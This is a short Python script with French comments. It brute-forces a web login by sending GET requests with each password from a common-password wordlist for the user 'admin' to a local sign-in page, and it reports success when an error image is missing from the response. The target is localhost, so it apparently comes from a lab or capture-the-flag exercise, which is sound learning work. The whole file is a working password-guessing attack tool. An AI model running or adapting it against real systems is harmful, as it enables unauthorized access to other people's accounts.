import requests

# config
url = "http://127.0.0.1:8080/index.php"
username = "admin"
wordlist = "10k-most-common.txt"

# ouvre le dictionnaire de mdp
with open(wordlist, 'r') as f:
    for line in f:
        password = line.strip()
        
        # paremetre get
        params = {
            'page': 'signin',
            'username': username,
            'password': password,
            'Login': 'Login'
        }
        
        # On envoie la requête
        response = requests.get(url, params=params)
        
        # si "WrongAnswer.gif" n'est pas dans la page alors on a peut-etre trouver
        if "WrongAnswer.gif" not in response.text:
            print(f"[+] SUCCESS! Password found: {password}")
            break
        else:
            print(f"[-] Trying: {password}", end="\r")
